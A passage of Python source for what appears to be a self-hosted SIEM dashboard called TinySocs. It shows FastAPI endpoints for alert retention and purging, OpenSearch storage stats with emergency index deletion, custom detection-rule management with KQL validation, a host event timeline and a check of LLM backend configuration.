        _alert_states[alert_id] = {"status": "new", "notes": ""}
    _alert_states[alert_id]["tags"] = [str(t).strip() for t in tags if str(t).strip()]
    _alert_states[alert_id]["updated_at"] = datetime.now(timezone.utc).isoformat()
    _save_alert_states()
    return {"ok": True, "alert_id": alert_id, "tags": _alert_states[alert_id]["tags"]}


@dashboard_app.post("/api/alerts/purge")
def api_alerts_purge(body: Dict[str, Any] = Body(...)):
    """Delete alerts older than the specified number of days from OpenSearch.

    Also purges corresponding alert states from the local state file.
    Body: {"older_than_days": 30}
    """
    import requests as _req
    try:
        import urllib3 as _u3
        _u3.disable_warnings(_u3.exceptions.InsecureRequestWarning)
    except Exception:
        pass

    days = int(body.get("older_than_days", 30))
    if days < 1:
        return JSONResponse(status_code=400, content={"ok": False, "error": "older_than_days must be >= 1"})

    url = os.getenv("SIEM_URL", "https://localhost:9201")
    user = os.getenv("SIEM_USER", "admin")
    passwd = os.getenv("SIEM_PASS", "")
    verify = _resolve_ca_cert()

    delete_body = {
        "query": {"range": {"timestamp": {"lt": f"now-{days}d"}}}
    }
    try:
        resp = _req.post(
            f"{url.rstrip('/')}/tinysocs-alerts-*/_delete_by_query?ignore_unavailable=true&allow_no_indices=true",
            json=delete_body,
            auth=(user, passwd),
            verify=verify,
            timeout=30,
        )
        # No alerts index yet — nothing to purge
        if resp.status_code in (404, 400):
            return {"deleted": 0, "message": "No alerts index exists yet"}
        resp.raise_for_status()
        result = resp.json()
        deleted = result.get("deleted", 0)

        # Also purge old alert states from local file
        _init_alert_state_file()
        stale_keys = [
            k for k, v in _alert_states.items()
            if v.get("status") == "dismissed"
        ]
        # Only remove dismissed states (keep acknowledged/new as they may still matter)
        for k in stale_keys:
            _alert_states.pop(k, None)
        _save_alert_states()

        # Also purge chat sessions to keep things clean
        _chat_sessions.clear()
        _save_chat_sessions()

        return {"ok": True, "deleted_alerts": deleted, "purged_states": len(stale_keys), "purged_chats": True}
    except Exception as exc:
        return JSONResponse(status_code=500, content={"ok": False, "error": str(exc)[:200]})


@dashboard_app.get("/api/alerts/retention")
def api_alerts_retention():
    """Get current alert retention config and stats."""
    retention_days = int(os.getenv("ALERT_RETENTION_DAYS", "90"))
    _init_alert_state_file()
    total_states = len(_alert_states)
    by_status = {}
    for v in _alert_states.values():
        s = v.get("status", "new")
        by_status[s] = by_status.get(s, 0) + 1
    return {
        "retention_days": retention_days,
        "tracked_alerts": total_states,
        "by_status": by_status,
    }


# ---------------------------------------------------------------------------
# Retention settings + Storage stats
# ---------------------------------------------------------------------------

@dashboard_app.get("/api/settings/retention")
def api_get_retention():
    """Get current retention settings."""
    return {
        "winlog_days": int(os.getenv("WINLOG_RETENTION_DAYS", "30")),
        "alert_days": int(os.getenv("ALERT_RETENTION_DAYS", "90")),
        "custom_days": int(os.getenv("CUSTOM_RETENTION_DAYS", "30")),
    }


@dashboard_app.post("/api/settings/retention")
async def api_set_retention(request: Request):
    """Update retention settings and apply ISM policies to OpenSearch."""
    body = await request.json()
    pw = body.get("admin_password", "")
    if pw != _get_admin_password():
        return JSONResponse({"error": "Invalid admin password"}, status_code=401)

    winlog_days = body.get("winlog_days")
    alert_days = body.get("alert_days")
    custom_days = body.get("custom_days")

    if winlog_days is not None:
        winlog_days = int(winlog_days)
        if not 7 <= winlog_days <= 365:
            return JSONResponse({"error": "winlog_days must be 7-365"}, status_code=400)

    if alert_days is not None:
        alert_days = int(alert_days)
        if not 7 <= alert_days <= 365:
            return JSONResponse({"error": "alert_days must be 7-365"}, status_code=400)

    if custom_days is not None:
        custom_days = int(custom_days)
        if not 7 <= custom_days <= 365:
            return JSONResponse({"error": "custom_days must be 7-365"}, status_code=400)

    # Write to assistant.env
    env_path = _find_assistant_env()
    updates = {}
    if winlog_days is not None:
        updates["WINLOG_RETENTION_DAYS"] = str(winlog_days)
        os.environ["WINLOG_RETENTION_DAYS"] = str(winlog_days)
    if alert_days is not None:
        updates["ALERT_RETENTION_DAYS"] = str(alert_days)
        os.environ["ALERT_RETENTION_DAYS"] = str(alert_days)
    if custom_days is not None:
        updates["CUSTOM_RETENTION_DAYS"] = str(custom_days)
        os.environ["CUSTOM_RETENTION_DAYS"] = str(custom_days)

    if env_path and updates:
        try:
            _write_env_file(env_path, updates)
        except Exception as exc:
            return JSONResponse({"error": f"Failed to write env file: {exc}"}, status_code=500)

    # Apply ISM policies via bootstrap module
    try:
        from tinysocs.tinybox.opensearch_bootstrap import apply_retention_policies
        results = apply_retention_policies(winlog_days=winlog_days, alert_days=alert_days, custom_days=custom_days)
        all_ok = all(r.get("ok") for r in results.values())
    except Exception as exc:
        return {"ok": False, "error": f"ISM policy update failed: {exc}", "env_updated": True}

    return {
        "ok": all_ok,
        "winlog_days": winlog_days or int(os.getenv("WINLOG_RETENTION_DAYS", "30")),
        "alert_days": alert_days or int(os.getenv("ALERT_RETENTION_DAYS", "90")),
        "custom_days": custom_days or int(os.getenv("CUSTOM_RETENTION_DAYS", "30")),
        "ism_results": results,
    }


def _human_bytes(b: int) -> str:
    """Format byte count as human-readable string."""
    for unit in ("B", "KB", "MB", "GB", "TB"):
        if abs(b) < 1024:
            return f"{b:.1f} {unit}" if unit != "B" else f"{b} {unit}"
        b /= 1024
    return f"{b:.1f} PB"


def _parse_os_size(s: str) -> int:
    """Parse OpenSearch size string like '500mb', '1.2gb' to bytes."""
    if not s:
        return 0
    s = s.strip().lower()
    multipliers = {"b": 1, "kb": 1024, "mb": 1024**2, "gb": 1024**3, "tb": 1024**4}
    for suffix, mult in sorted(multipliers.items(), key=lambda x: -len(x[0])):
        if s.endswith(suffix):
            try:
                return int(float(s[: -len(suffix)]) * mult)
            except ValueError:
                return 0
    try:
        return int(s)
    except ValueError:
        return 0


def _demo_storage_stats() -> dict:
    """Synthetic storage stats for demo mode."""
    return {
        "indices": {
            "winlog": {
                "doc_count": 125340,
                "size_bytes": 524288000,
                "size_human": "500.0 MB",
                "index_count": 18,
                "retention_days": int(os.getenv("WINLOG_RETENTION_DAYS", "30")),
            },
            "alerts": {
                "doc_count": 3420,
                "size_bytes": 15728640,
                "size_human": "15.0 MB",
                "index_count": 42,
                "retention_days": int(os.getenv("ALERT_RETENTION_DAYS", "90")),
            },
            "other": {
                "doc_count": 48,
                "size_bytes": 65536,
                "size_human": "64.0 KB",
                "index_count": 2,
            },
            "total": {
                "doc_count": 128808,
                "size_bytes": 540082176,
                "size_human": "515.1 MB",
                "index_count": 62,
            },
        },
        "disk": {
            "total_bytes": 107374182400,
            "available_bytes": 85899345920,
            "used_percent": 20.0,
            "status": "healthy",
            "total_human": "100.0 GB",
            "available_human": "80.0 GB",
        },
        "cluster_status": "green",
    }


@dashboard_app.get("/api/storage/stats")
async def api_storage_stats():
    """Get storage usage stats: index sizes, disk usage, cluster health."""
    if os.getenv("TINYSOCS_DEMO_MODE") == "1":
        return _demo_storage_stats()

    siem_url = os.getenv("SIEM_URL", "https://localhost:9201").rstrip("/")
    try:
        import requests as _req
        from tinysocs.tls import get_siem_ssl_context

        ssl_ctx = get_siem_ssl_context()
        auth = (os.getenv("SIEM_USER", "admin"), os.getenv("SIEM_PASS", ""))
        verify = ssl_ctx if ssl_ctx else False
        timeout = 10

        # 1. Index sizes
        idx_resp = _req.get(
            f"{siem_url}/_cat/indices/tinysocs-*?format=json&h=index,docs.count,store.size",
            auth=auth, verify=verify, timeout=timeout,
        )
        indices_raw = idx_resp.json() if idx_resp.status_code == 200 else []

        winlog_docs = winlog_bytes = winlog_count = 0
        alert_docs = alert_bytes = alert_count = 0
        custom_docs = custom_bytes = custom_count = 0
        other_docs = other_bytes = other_count = 0

        for idx in indices_raw:
            name = idx.get("index", "")
            docs = int(idx.get("docs.count", 0) or 0)
            size = _parse_os_size(idx.get("store.size", "0"))
            if name.startswith("tinysocs-winlog-"):
                winlog_docs += docs
                winlog_bytes += size
                winlog_count += 1
            elif name.startswith("tinysocs-alerts-"):
                alert_docs += docs
                alert_bytes += size
                alert_count += 1
            elif name.startswith("tinysocs-custom-"):
                custom_docs += docs
                custom_bytes += size
                custom_count += 1
            else:
                other_docs += docs
                other_bytes += size
                other_count += 1

        total_docs = winlog_docs + alert_docs + custom_docs + other_docs
        total_bytes = winlog_bytes + alert_bytes + custom_bytes + other_bytes
        total_count = winlog_count + alert_count + custom_count + other_count

        # 2. Disk usage
        disk_resp = _req.get(
            f"{siem_url}/_nodes/stats/fs",
            auth=auth, verify=verify, timeout=timeout,
        )
        disk_total = disk_avail = 0
        if disk_resp.status_code == 200:
            nodes_data = disk_resp.json().get("nodes", {})
            for node in nodes_data.values():
                fs = node.get("fs", {}).get("total", {})
                disk_total += fs.get("total_in_bytes", 0)
                disk_avail += fs.get("available_in_bytes", 0)

        disk_used_pct = round((1 - disk_avail / disk_total) * 100, 1) if disk_total > 0 else 0
        if disk_used_pct >= 85:
            disk_status = "critical"
        elif disk_used_pct >= 70:
            disk_status = "warning"
        else:
            disk_status = "healthy"

        # 3. Cluster health
        health_resp = _req.get(
            f"{siem_url}/_cluster/health",
            auth=auth, verify=verify, timeout=timeout,
        )
        cluster_status = health_resp.json().get("status", "unknown") if health_resp.status_code == 200 else "unknown"

        result = {
            "indices": {
                "winlog": {
                    "doc_count": winlog_docs, "size_bytes": winlog_bytes,
                    "size_human": _human_bytes(winlog_bytes), "index_count": winlog_count,
                    "retention_days": int(os.getenv("WINLOG_RETENTION_DAYS", "30")),
                },
                "alerts": {
                    "doc_count": alert_docs, "size_bytes": alert_bytes,
                    "size_human": _human_bytes(alert_bytes), "index_count": alert_count,
                    "retention_days": int(os.getenv("ALERT_RETENTION_DAYS", "90")),
                },
                "custom": {
                    "doc_count": custom_docs, "size_bytes": custom_bytes,
                    "size_human": _human_bytes(custom_bytes), "index_count": custom_count,
                    "retention_days": int(os.getenv("CUSTOM_RETENTION_DAYS", "30")),
                },
                "other": {
                    "doc_count": other_docs, "size_bytes": other_bytes,
                    "size_human": _human_bytes(other_bytes), "index_count": other_count,
                },
                "total": {
                    "doc_count": total_docs, "size_bytes": total_bytes,
                    "size_human": _human_bytes(total_bytes), "index_count": total_count,
                },
            },
            "disk": {
                "total_bytes": disk_total, "available_bytes": disk_avail,
                "used_percent": disk_used_pct, "status": disk_status,
                "total_human": _human_bytes(disk_total),
                "available_human": _human_bytes(disk_avail),
            },
            "cluster_status": cluster_status,
        }

        # Fire disk space alert if usage is critical (once per 24h)
        global _disk_alert_last_fire
        import time as _time
        now_ts = _time.time()
        if disk_used_pct >= 80 and (now_ts - _disk_alert_last_fire) > 86400:
            try:
                from datetime import datetime, timezone
                alert_doc = {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "alert": {
                        "id": f"TS-DISK-001|disk|{datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:00:00Z')}",
                        "rule_id": "TS-DISK-001",
                        "rule_name": "disk_space_warning",
                        "severity": "critical" if disk_used_pct >= 90 else "high",
                        "description": f"Disk usage at {disk_used_pct}% — consider reducing retention or expanding storage",
                        "event_count": 1,
                        "first_seen": datetime.now(timezone.utc).isoformat(),
                        "last_seen": datetime.now(timezone.utc).isoformat(),
                    },
                    "source": {"disk_used_percent": disk_used_pct, "available": _human_bytes(disk_avail)},
                }
                idx_name = f"tinysocs-alerts-{datetime.now(timezone.utc).strftime('%Y.%m.%d')}"
                _req.post(
                    f"{siem_url}/{idx_name}/_doc",
                    json=alert_doc, auth=auth, verify=verify, timeout=5,
                )
                _disk_alert_last_fire = now_ts
            except Exception:
                pass  # Best-effort alerting

        # Auto-purge: if disk is dangerously full, delete oldest winlog indices
        global _auto_purge_last_run
        if disk_used_pct >= 88 and (now_ts - _auto_purge_last_run) > 3600:
            try:
                purge_result = _emergency_purge_indices(max_delete=3, target_pct=75.0)
                _auto_purge_last_run = now_ts
                if purge_result.get("ok") and purge_result.get("deleted_indices"):
                    result["auto_purge"] = {
                        "triggered": True,
                        "deleted": purge_result["deleted_indices"],
                        "freed_human": purge_result.get("freed_human", ""),
                        "disk_used_pct_after": purge_result.get("disk_used_pct_after"),
                    }
                    # Update the disk stats in the result
                    if purge_result.get("disk_used_pct_after"):
                        result["disk"]["used_percent"] = purge_result["disk_used_pct_after"]
                        result["disk"]["status"] = (
                            "critical" if purge_result["disk_used_pct_after"] >= 85
                            else "warning" if purge_result["disk_used_pct_after"] >= 70
                            else "healthy"
                        )
            except Exception:
                pass  # Best-effort auto-purge

        return result
    except Exception as exc:
        return {"error": str(exc)}


# Disk space alert cooldown (in-memory, once per 24h)
_disk_alert_last_fire: float = 0.0

# Emergency auto-purge cooldown (in-memory, once per hour)
_auto_purge_last_run: float = 0.0


def _emergency_purge_indices(max_delete: int = 5, target_pct: float = 75.0) -> dict:
    """Delete oldest winlog indices to free disk space.

    Returns dict with deleted_indices, freed_bytes, disk_used_pct_after.
    Winlog indices are purged first (highest volume, least critical).
    """
    import requests as _req
    from tinysocs.tls import get_siem_ssl_context

    siem_url = os.getenv("SIEM_URL", "https://localhost:9201").rstrip("/")
    ssl_ctx = get_siem_ssl_context()
    auth = (os.getenv("SIEM_USER", "admin"), os.getenv("SIEM_PASS", ""))
    verify = ssl_ctx if ssl_ctx else False
    timeout = 15

    # Get all winlog indices sorted by name (oldest date suffix first)
    resp = _req.get(
        f"{siem_url}/_cat/indices/tinysocs-winlog-*?format=json&h=index,store.size&s=index:asc",
        auth=auth, verify=verify, timeout=timeout,
    )
    if resp.status_code != 200:
        return {"ok": False, "error": f"Failed to list indices: {resp.status_code}"}

    indices = resp.json()
    if not indices:
        return {"ok": True, "deleted_indices": [], "freed_bytes": 0, "message": "No winlog indices to purge"}

    deleted = []
    freed = 0

    for idx_info in indices[:max_delete]:
        idx_name = idx_info.get("index", "")
        idx_size = _parse_os_size(idx_info.get("store.size", "0"))
        del_resp = _req.delete(
            f"{siem_url}/{idx_name}",
            auth=auth, verify=verify, timeout=timeout,
        )
        if del_resp.status_code == 200:
            deleted.append(idx_name)
            freed += idx_size

        # Check disk after each deletion
        disk_resp = _req.get(
            f"{siem_url}/_nodes/stats/fs",
            auth=auth, verify=verify, timeout=timeout,
        )
        if disk_resp.status_code == 200:
            disk_total = disk_avail = 0
            for node in disk_resp.json().get("nodes", {}).values():
                fs = node.get("fs", {}).get("total", {})
                disk_total += fs.get("total_in_bytes", 0)
                disk_avail += fs.get("available_in_bytes", 0)
            current_pct = round((1 - disk_avail / disk_total) * 100, 1) if disk_total > 0 else 0
            if current_pct <= target_pct:
                break

    # Clear read-only blocks on remaining indices
    try:
        _req.put(
            f"{siem_url}/tinysocs-*/_settings",
            json={"index.blocks.read_only_allow_delete": None},
            auth=auth, verify=verify, timeout=timeout,
        )
    except Exception:
        pass  # Best-effort unblock

    # Get final disk usage
    disk_after_pct = 0.0
    try:
        disk_resp = _req.get(
            f"{siem_url}/_nodes/stats/fs",
            auth=auth, verify=verify, timeout=timeout,
        )
        if disk_resp.status_code == 200:
            dt = da = 0
            for node in disk_resp.json().get("nodes", {}).values():
                fs = node.get("fs", {}).get("total", {})
                dt += fs.get("total_in_bytes", 0)
                da += fs.get("available_in_bytes", 0)
            disk_after_pct = round((1 - da / dt) * 100, 1) if dt > 0 else 0
    except Exception:
        pass

    return {
        "ok": True,
        "deleted_indices": deleted,
        "freed_bytes": freed,
        "freed_human": _human_bytes(freed),
        "disk_used_pct_after": disk_after_pct,
    }


@dashboard_app.post("/api/storage/emergency-purge")
async def api_emergency_purge(request: Request):
    """Delete oldest winlog indices to free disk space immediately."""
    body = await request.json()
    pw = body.get("admin_password", "")
    if pw != _get_admin_password():
        return JSONResponse({"error": "Invalid admin password"}, status_code=401)

    result = _emergency_purge_indices(
        max_delete=int(body.get("max_delete", 5)),
        target_pct=float(body.get("target_pct", 75.0)),
    )

    # Fire informational alert about the purge
    if result.get("ok") and result.get("deleted_indices"):
        try:
            import requests as _req
            from datetime import datetime, timezone
            from tinysocs.tls import get_siem_ssl_context

            siem_url = os.getenv("SIEM_URL", "https://localhost:9201").rstrip("/")
            ssl_ctx = get_siem_ssl_context()
            auth = (os.getenv("SIEM_USER", "admin"), os.getenv("SIEM_PASS", ""))
            verify = ssl_ctx if ssl_ctx else False
            alert_doc = {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "alert": {
                    "id": f"TS-DISK-002|purge|{datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}",
                    "rule_id": "TS-DISK-002",
                    "rule_name": "emergency_disk_purge",
                    "severity": "high",
                    "description": f"Emergency purge: deleted {len(result['deleted_indices'])} oldest event indices ({result['freed_human']}) to prevent disk-full lockout",
                    "event_count": 1,
                    "first_seen": datetime.now(timezone.utc).isoformat(),
                    "last_seen": datetime.now(timezone.utc).isoformat(),
                },
                "source": {
                    "deleted_indices": result["deleted_indices"],
                    "freed_bytes": result["freed_bytes"],
                    "disk_used_pct_after": result.get("disk_used_pct_after"),
                },
            }
            idx_name = f"tinysocs-alerts-{datetime.now(timezone.utc).strftime('%Y.%m.%d')}"
            _req.post(
                f"{siem_url}/{idx_name}/_doc",
                json=alert_doc, auth=auth, verify=verify, timeout=5,
            )
        except Exception:
            pass  # Best-effort alerting

    return result


# ---------------------------------------------------------------------------
# Alert Rules management — custom rules stored as JSON, built-in rules read from YAML
# ---------------------------------------------------------------------------
_custom_rules: List[Dict[str, Any]] = []
_CUSTOM_RULES_FILE: Optional[Path] = None

_RULE_REQUIRED_FIELDS = {"id", "description", "kql", "severity"}
_RULE_ALL_FIELDS = {
    "id", "description", "index", "time_field", "kql", "group_by",
    "threshold", "severity", "category", "enabled", "source",
}
_SEVERITY_OPTIONS = ("low", "medium", "high", "critical", "info")
_CATEGORY_OPTIONS = (
    "auth", "powershell", "endpoint", "identity", "persistence",
    "lateral", "network", "cloud", "custom",
)


def _init_custom_rules_file() -> Path:
    """Determine and load the custom rules persistence file."""
    global _custom_rules, _CUSTOM_RULES_FILE
    if _CUSTOM_RULES_FILE is not None:
        return _CUSTOM_RULES_FILE
    candidates = [
        Path(os.getenv("ProgramData", "C:\\ProgramData")) / "TinySocs" / "custom_rules.json",
        Path("/var/lib/tinysocs/custom_rules.json"),
        Path.cwd() / "custom_rules.json",
    ]
    for p in candidates:
        try:
            p.parent.mkdir(parents=True, exist_ok=True)
            _CUSTOM_RULES_FILE = p
            if p.is_file():
                _custom_rules = json.loads(p.read_text(encoding="utf-8"))
            return p
        except Exception:
            continue
    _CUSTOM_RULES_FILE = candidates[-1]
    return _CUSTOM_RULES_FILE


def _save_custom_rules() -> None:
    """Persist custom rules to disk and notify the detection registry."""
    try:
        path = _init_custom_rules_file()
        path.write_text(json.dumps(_custom_rules, indent=2, default=str), encoding="utf-8")
    except Exception:
        pass
    # Reload the detection registry so the engine picks up changes
    try:
        from tinysocs.agent.detections.registry import reload_rules
        reload_rules()
    except Exception:
        pass


def _validate_kql(kql: str, index: str = "tinysocs-winlog-*") -> Dict[str, Any]:
    """Test a KQL query against OpenSearch.

    Returns {"valid": True/False, "error": str|None, "hits": int, "warning": str|None}.
    """
    try:
        body = {
            "query": {"query_string": {"query": kql}},
            "size": 0,
            "track_total_hits": True,
        }
        resp = _safe_query(index, body, size=0)
        if resp.get("error"):
            return {"valid": False, "error": resp["error"], "hits": 0, "warning": None}
        total_hit = resp.get("hits", {}).get("total", 0)
        hits = total_hit.get("value", 0) if isinstance(total_hit, dict) else int(total_hit)
        warning = None
        if hits == 0:
            warning = f"Query is valid but matched 0 events in '{index}'. The rule will never fire unless matching data arrives."
        return {"valid": True, "error": None, "hits": hits, "warning": warning}
    except Exception as exc:
        return {"valid": False, "error": str(exc), "hits": 0, "warning": None}


def _load_builtin_rules() -> List[Dict[str, Any]]:
    """Load built-in rules from the packaged rules.yaml (read-only)."""
    try:
        import yaml
        from importlib import resources as _res
        pkg = "tinysocs.agent.detections"
        text = _res.files(pkg).joinpath("rules.yaml").read_text(encoding="utf-8")
        raw = yaml.safe_load(text) or []
        for r in raw:
            r.setdefault("source", "built-in")
            r.setdefault("enabled", True)
        return raw
    except Exception:
        return []


@dashboard_app.get("/api/rules")
def api_rules_list():
    """List all detection rules (built-in + custom)."""
    builtin = _load_builtin_rules()
    _init_custom_rules_file()
    combined = []
    for r in builtin:
        combined.append({**r, "source": "built-in", "editable": False})
    for r in _custom_rules:
        combined.append({**r, "source": r.get("source", "custom"), "editable": True})
    return {"rules": combined, "count": len(combined)}


@dashboard_app.post("/api/rules")
def api_rules_create(body: Dict[str, Any] = Body(...)):
    """Create a single custom detection rule."""
    _init_custom_rules_file()
    rule = body.get("rule", body)

    # Validate required fields
    missing = _RULE_REQUIRED_FIELDS - set(rule.keys())
    if missing:
        return JSONResponse(status_code=400, content={"error": f"Missing required fields: {', '.join(sorted(missing))}"})

    rule_id = str(rule["id"]).strip()
    if not rule_id:
        return JSONResponse(status_code=400, content={"error": "Rule ID cannot be empty"})

    # Check for duplicate ID
    existing_ids = {r["id"] for r in _custom_rules}
    builtin_ids = {r["id"] for r in _load_builtin_rules()}
    if rule_id in existing_ids:
        return JSONResponse(status_code=409, content={"error": f"Custom rule '{rule_id}' already exists"})
    if rule_id in builtin_ids:
        return JSONResponse(status_code=409, content={"error": f"Rule ID '{rule_id}' conflicts with a built-in rule"})

    # Validate KQL against OpenSearch (skip if explicitly requested)
    kql = str(rule["kql"]).strip()
    idx = str(rule.get("index", "tinysocs-winlog-*")).strip()
    kql_warning = None
    if not body.get("skip_validation"):
        vr = _validate_kql(kql, idx)
        if not vr["valid"]:
            return JSONResponse(status_code=422, content={
                "error": f"KQL validation failed: {vr['error']}",
                "hint": "Fix the query syntax and try again.",
            })
        kql_warning = vr.get("warning")

    # Normalise and store
    clean = {
        "id": rule_id,
        "description": str(rule.get("description", "")).strip(),
        "index": idx,
        "time_field": str(rule.get("time_field", "@timestamp")).strip(),
        "kql": kql,
        "group_by": rule.get("group_by") if isinstance(rule.get("group_by"), list) else ["host.name"],
        "threshold": int(rule.get("threshold", 1)),
        "severity": str(rule.get("severity", "medium")).lower(),
        "category": str(rule.get("category", "custom")).lower(),
        "enabled": bool(rule.get("enabled", True)),
        "source": "custom",
        "created_at": datetime.now(timezone.utc).isoformat(),
    }
    _custom_rules.append(clean)
    _save_custom_rules()
    result: Dict[str, Any] = {"ok": True, "rule": clean}
    if kql_warning:
        result["warning"] = kql_warning
    return result


@dashboard_app.post("/api/rules/upload")
def api_rules_upload(body: Dict[str, Any] = Body(...)):
    """Upload a rule pack (YAML or JSON content as a string).

    Body: {"content": "<yaml or json string>", "format": "yaml"|"json"}
    """
    _init_custom_rules_file()
    content = body.get("content", "")
    fmt = body.get("format", "yaml").lower()

    if not content:
        return JSONResponse(status_code=400, content={"error": "No content provided"})

    try:
        if fmt == "yaml":
            import yaml
            rules = yaml.safe_load(content)
        else:
            rules = json.loads(content)
    except Exception as exc:
        return JSONResponse(status_code=400, content={"error": f"Parse error: {exc}"})

    if not isinstance(rules, list):
        return JSONResponse(status_code=400, content={"error": "Expected a list of rule objects"})

    existing_ids = {r["id"] for r in _custom_rules}
    builtin_ids = {r["id"] for r in _load_builtin_rules()}
    added = []
    skipped = []

    for rule in rules:
        if not isinstance(rule, dict) or not rule.get("id"):
            skipped.append({"reason": "missing id", "rule": str(rule)[:80]})
            continue
        rid = str(rule["id"]).strip()
        if rid in existing_ids or rid in builtin_ids:
            skipped.append({"reason": "duplicate", "id": rid})
            continue
        # Validate minimum fields
        if not rule.get("kql"):
            skipped.append({"reason": "missing kql", "id": rid})
            continue

        clean = {
            "id": rid,
            "description": str(rule.get("description", "")).strip(),
            "index": str(rule.get("index", "tinysocs-winlog-*")).strip(),
            "time_field": str(rule.get("time_field", "@timestamp")).strip(),
            "kql": str(rule["kql"]).strip(),
            "group_by": rule.get("group_by") if isinstance(rule.get("group_by"), list) else ["host.name"],
            "threshold": int(rule.get("threshold", 1)),
            "severity": str(rule.get("severity", "medium")).lower(),
            "category": str(rule.get("category", "custom")).lower(),
            "enabled": bool(rule.get("enabled", True)),
            "source": body.get("pack_name", "uploaded-pack"),
            "created_at": datetime.now(timezone.utc).isoformat(),
        }
        _custom_rules.append(clean)
        existing_ids.add(rid)
        added.append(rid)

    _save_custom_rules()
    return {"ok": True, "added": len(added), "skipped": len(skipped), "added_ids": added, "skipped_details": skipped}


@dashboard_app.put("/api/rules/{rule_id}")
def api_rules_update(rule_id: str, body: Dict[str, Any] = Body(...)):
    """Update a custom rule (cannot update built-in rules)."""
    _init_custom_rules_file()
    for i, r in enumerate(_custom_rules):
        if r["id"] == rule_id:
            updates = body.get("rule", body)
            # Validate KQL if it's being changed
            if "kql" in updates and not body.get("skip_validation"):
                new_kql = str(updates["kql"]).strip()
                idx = str(updates.get("index", r.get("index", "tinysocs-winlog-*"))).strip()
                vr = _validate_kql(new_kql, idx)
                if not vr["valid"]:
                    return JSONResponse(status_code=422, content={
                        "error": f"KQL validation failed: {vr['error']}",
                        "hint": "Fix the query syntax and try again.",
                    })
            for k in ("description", "kql", "index", "time_field", "severity", "category", "threshold", "group_by", "enabled"):
                if k in updates:
                    _custom_rules[i][k] = updates[k]
            _custom_rules[i]["updated_at"] = datetime.now(timezone.utc).isoformat()
            _save_custom_rules()
            return {"ok": True, "rule": _custom_rules[i]}
    return JSONResponse(status_code=404, content={"error": f"Custom rule '{rule_id}' not found (built-in rules cannot be edited)"})


@dashboard_app.delete("/api/rules/{rule_id}")
def api_rules_delete(rule_id: str):
    """Delete a custom rule (cannot delete built-in rules)."""
    _init_custom_rules_file()
    for i, r in enumerate(_custom_rules):
        if r["id"] == rule_id:
            removed = _custom_rules.pop(i)
            _save_custom_rules()
            return {"ok": True, "deleted": removed["id"]}
    return JSONResponse(status_code=404, content={"error": f"Custom rule '{rule_id}' not found (built-in rules cannot be deleted)"})


@dashboard_app.post("/api/rules/{rule_id}/toggle")
def api_rules_toggle(rule_id: str):
    """Toggle a custom rule's enabled state."""
    _init_custom_rules_file()
    for i, r in enumerate(_custom_rules):
        if r["id"] == rule_id:
            _custom_rules[i]["enabled"] = not r.get("enabled", True)
            _save_custom_rules()
            return {"ok": True, "id": rule_id, "enabled": _custom_rules[i]["enabled"]}
    return JSONResponse(status_code=404, content={"error": f"Custom rule '{rule_id}' not found"})


@dashboard_app.post("/api/rules/validate")
def api_rules_validate(body: Dict[str, Any] = Body(...)):
    """Validate a KQL query against OpenSearch without saving anything."""
    kql = str(body.get("kql", "")).strip()
    index = str(body.get("index", "tinysocs-winlog-*")).strip()
    if not kql:
        return JSONResponse(status_code=400, content={"error": "No KQL query provided"})
    return _validate_kql(kql, index)


@dashboard_app.get("/api/host/timeline")
async def api_host_timeline(
    hostname: str = Query("", description="Host to query (blank = all hosts)"),
    hours: int = Query(24, ge=1, le=720),
):
    """Event count over time for a host (or all hosts), bucketed with channel breakdown."""
    if _DEMO_MODE:
        return _demo_host_timeline(hostname, hours)
    # Determine interval based on time range
    if hours <= 6:
        interval = "5m"
    elif hours <= 48:
        interval = "1h"
    else:
        interval = "6h"

    # Build query — filter by hostname(s) if provided, otherwise fleet-wide
    must_clauses: list = [
        {"range": {"@timestamp": {"gte": f"now-{hours}h", "lte": "now"}}},
    ]
    if hostname:
        # Support comma-separated hostnames for multi-select
        hosts = [h.strip() for h in hostname.split(",") if h.strip()]
        if len(hosts) == 1:
            must_clauses.append({"term": {"winlog.computer_name": hosts[0]}})
        elif len(hosts) > 1:
            must_clauses.append({"terms": {"winlog.computer_name": hosts}})

    body = {
        "query": {
            "bool": {
                "must": must_clauses,
            }
        },
        "aggs": {
            "over_time": {
                "date_histogram": {
                    "field": "@timestamp",
                    "fixed_interval": interval,
                    "min_doc_count": 0,
                    "extended_bounds": {
                        "min": f"now-{hours}h",
                        "max": "now",
                    },
                },
                "aggs": {
                    "by_channel": {
                        "terms": {"field": "winlog.channel", "size": 10},
                    }
                },
            }
        },
    }
    resp = await _safe_query_async("tinysocs-winlog-*", body)

    # Collect all channels seen across all buckets
    all_channels: set = set()
    raw_buckets = resp.get("aggregations", {}).get("over_time", {}).get("buckets", [])
    for b in raw_buckets:
        for ch in b.get("by_channel", {}).get("buckets", []):
            all_channels.add(ch["key"])

    buckets = []
    for b in raw_buckets:
        channel_counts = {
            ch["key"]: ch["doc_count"]
            for ch in b.get("by_channel", {}).get("buckets", [])
        }
        buckets.append({
            "time": b.get("key_as_string", ""),
            "count": b.get("doc_count", 0),
            "channels": channel_counts,
        })
    return {"hostname": hostname, "hours": hours, "interval": interval, "buckets": buckets, "channels": sorted(all_channels), "error": resp.get("error")}


def _llm_is_configured() -> Dict[str, Any]:
    """Check whether an LLM backend is configured and return status info."""
    mode = os.getenv("LLM_MODE", "openai").strip().lower()
    if mode in ("offline", "disabled", "none", ""):
        return {"configured": False, "mode": mode, "reason": "LLM is disabled. Set LLM_MODE in Settings to enable AI features."}
    if mode in ("anthropic", "claude"):
        key = os.getenv("ANTHROPIC_API_KEY", "")
        if not key:
            return {"configured": False, "mode": mode, "reason": "Anthropic API key not set. Add it in Settings."}
        return {"configured": True, "mode": mode}
    if mode == "openai":
        key = os.getenv("OPENAI_API_KEY", "")
        if not key:
            return {"configured": False, "mode": mode, "reason": "OpenAI API key not set. Add it in Settings."}
        return {"configured": True, "mode": mode}
    if mode == "ollama":
        return {"configured": True, "mode": mode}
    return {"configured": False, "mode": mode, "reason": f"Unknown LLM_MODE '{mode}'. Use 'openai', 'anthropic', or 'ollama'."}


@dashboard_app.get("/api/llm/status")
def api_llm_status():
    """Check whether an LLM backend is available for AI features."""
    return _llm_is_configured()


@dashboard_app.post("/api/detections/summarize")
def api_detection_summarize(body: Dict[str, Any] = Body(...)):
    """Generate an LLM summary for a specific fired detection."""
    alert_data = body.get("alert", {})
    if not alert_data:
